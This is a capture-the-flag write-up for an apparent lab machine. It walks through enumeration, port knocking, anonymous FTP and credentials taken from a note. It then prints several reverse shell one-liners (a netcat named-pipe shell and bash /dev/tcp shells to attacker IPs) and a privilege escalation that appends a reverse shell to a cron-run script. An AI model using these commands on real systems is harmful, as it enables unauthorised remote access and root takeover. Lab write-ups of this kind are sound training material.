## Enumeration
### Nmap Scan
The first step of my enumeration was a scan withÂ **nmap**. by the command:

```
nmap -sV -p- 10.10.229.237

PORT STATE SERVICE REASON VERSION  
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
4420/tcp open nvm-express? syn-ack  
8080/tcp open http syn-ack Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
```



There is a web server available on port 8080 where we will find a forum page powered by [phpBB](https://www.phpbb.com/) : and it's an Internet forum package in the PHP scripting language. The name "phpBB" is an abbreviation of PHP Bulletin Board.

And by looking around in the forum I see the last post that have some clues about the next step `knock`ðŸ‘Š.

### Port Knocking
**port knocking** is a method of externally opening [ports](https://en.wikipedia.org/wiki/TCP_and_UDP_port) on a [firewall](https://en.wikipedia.org/wiki/Firewall_(networking) "Firewall (networking)") by generating a connection attempt on a set of prespecified closed ports. 
The port 21 will only be open when you request 1111, 2222, 3333, 4444 in sequence.

![Knock Image](/images/Cat/knock.jpg)

```
knock 10.10.229.237 1111 2222 3333 4444
```

After many knocking commands I run the nmap command and I get a new open port.

![Scan2 Image](/images/Cat/scan2.jpg)

So I connected with anonymous in ftp and i found a `note.txt`:

![Ftp image](/images/Cat/ftp.jpg)

```
cat note.txt  
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.Connect to port 4420, the password is sa*********.  
- ca*****r
```

So the `note.txt` gives us the credentials for port 4420 and We gonna try to connect to the port using netcat. when I connected to the port i try a rm reverse shell on my 4444 port.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
```

So I browse for a little bit and I found an executable in the home directory when I run it, It demand us a password so I decided to output the binary using cat command :

```
cat runme
```

And I found the password. When entering the correct password in the binary it generates a SSH key.

```
chmod 600 id_rsa
ssh catlover@10.10.61.235 -i id_rsa 
```

## User Flag

By browsing dome of the directories I found the user flag in the /root :

```
7cf90a0e7c5d****************************
```

## Root Flag

So first I output the .bash_history file and I found it not empty :

```
...
cat /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh 
cat /opt/clean/clean.sh 
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
cat /var/log/dpkg.log 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
exit
```

```
cat /opt/clean/clean.sh   
#!/bin/bash

rm -rf /tmp/*
```

So the clean shell cleans and remove all the temporary files on the system, So lets try to add a reverse shell on the clean.sh file.

```
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.174.180/4444 0>&1'" >> clean.sh
```

After 1 to 2 minutes I finally got the shell and the root flag:

```
cat root.txt
Here is your flag:
